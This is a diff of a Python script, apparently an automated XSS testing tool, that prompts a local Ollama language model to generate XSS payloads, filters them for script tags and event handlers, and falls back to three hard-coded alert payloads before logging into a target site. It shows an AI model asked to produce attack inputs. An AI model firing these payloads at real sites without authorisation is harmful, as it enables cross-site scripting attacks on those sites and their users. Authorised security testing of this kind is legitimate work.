@@ -10,23 +10,13 @@ session = requests.Session()
 
 
 # ---------------- GENERATE PAYLOADS ----------------
-payloads = [p.strip() for p in text.split("\n") if p.strip()]
-
-# ✅ FILTER ONLY VALID XSS PAYLOADS
-payloads = [
-    p for p in payloads
-    if "<script" in p or "onerror" in p or "onload" in p or "javascript:" in p
-]
-
 def generate_payloads():
 
     print("[+] Generating XSS payloads using Ollama...")
 
     prompt = """
-Generate 10 XSS payloads for penetration testing.
-Return only payloads line by line.
-Example:
-<script>alert(1)</script>
+Generate 10 valid XSS payloads.
+Return ONLY payloads line by line.
 """
 
     try:
@@ -40,17 +30,27 @@ Example:
         )
 
         text = response.json()["response"]
-        payloads = [p.strip() for p in text.split("\n") if p.strip()]
+
+        payloads = [
+            p.strip() for p in text.split("\n") if p.strip()
+        ]
+
+        # ✅ FILTER ONLY VALID PAYLOADS
+        payloads = [
+            p for p in payloads
+            if "<script" in p or "onerror" in p or "onload" in p or "javascript:" in p
+        ]
 
         return payloads
 
-    except:
+    except Exception as e:
+        print("⚠️ Ollama failed, using default payloads")
+
         return [
             "<script>alert(1)</script>",
             "<img src=x onerror=alert(1)>",
             "<svg/onload=alert(1)>"
         ]
-
 
 # ---------------- LOGIN ----------------
 def login():
